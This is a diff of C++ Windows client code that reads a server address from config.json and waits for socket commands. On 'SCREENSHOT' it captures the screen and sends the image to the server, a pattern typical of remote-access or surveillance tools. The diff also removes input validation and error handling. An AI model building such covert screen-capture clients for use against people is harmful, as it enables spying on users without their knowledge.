@@ -14,36 +14,18 @@ using json = nlohmann::json;
 
 // 读取配置文件
 std::pair<std::string, int> ReadConfig() {
-    try {
-        std::ifstream configFile("config.json");
-        if (!configFile.is_open()) {
-            std::cerr << "Failed to open config.json" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-
-        json config;
-        configFile >> config;
-
-        // 检查字段是否存在并且类型是否正确
-        if (!config.contains("server_ip") || !config["server_ip"].is_string()) {
-            std::cerr << "Invalid or missing 'server_ip' in config.json" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-
-        if (!config.contains("server_port") || !config["server_port"].is_number_integer()) {
-            std::cerr << "Invalid or missing 'server_port' in config.json" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-
-        std::string serverIp = config.at("server_ip").get<std::string>();
-        int serverPort = config.at("server_port").get<int>();
-
-        return std::make_pair(serverIp, serverPort);
-    }
-    catch (const json::exception& e) {
-        std::cerr << "JSON exception: " << e.what() << std::endl;
+    std::ifstream configFile("config.json");
+    if (!configFile.is_open()) {
+        std::cerr << "Failed to open config.json" << std::endl;
         exit(EXIT_FAILURE);
     }
+
+    json config;
+    configFile >> config;
+
+    std::string serverIp = config["server_ip"];
+    int serverPort = config["server_port"];
+    return std::make_pair(serverIp, serverPort);
 }
 
 // 连接到服务器
@@ -84,35 +66,19 @@ void ListenForCommands(SOCKET sock) {
         if (bytesReceived > 0) {
             std::string command(buffer, bytesReceived);
             if (command == "SCREENSHOT") {
-                CaptureScreenshot(); // 直接调用截图函数
+                CaptureScreenshot(true);
 
-                // 读取并发送 screenshot.bmp 文件
+                // 读取并发送screenshot.bmp文件
                 std::ifstream screenshot("screenshot.bmp", std::ios::binary);
-                if (!screenshot) {
-                    std::cerr << "Failed to open screenshot.bmp" << std::endl;
-                    continue;
-                }
-
                 screenshot.seekg(0, std::ios::end);
                 std::streamsize size = screenshot.tellg();
                 screenshot.seekg(0, std::ios::beg);
 
                 std::vector<char> fileBuffer(size);
                 if (screenshot.read(fileBuffer.data(), size)) {
-                    send(sock, fileBuffer.data(), size, 0);
-                }
-                else {
-                    std::cerr << "Failed to read screenshot.bmp" << std::endl;
+                    send(sock, fileBuffer.data(), static_cast<int>(size), 0);
                 }
             }
-        }
-        else if (bytesReceived == 0) {
-            // Connection closed
-            break;
-        }
-        else {
-            std::cerr << "recv failed with error: " << WSAGetLastError() << std::endl;
-            break;
         }
     }
 }
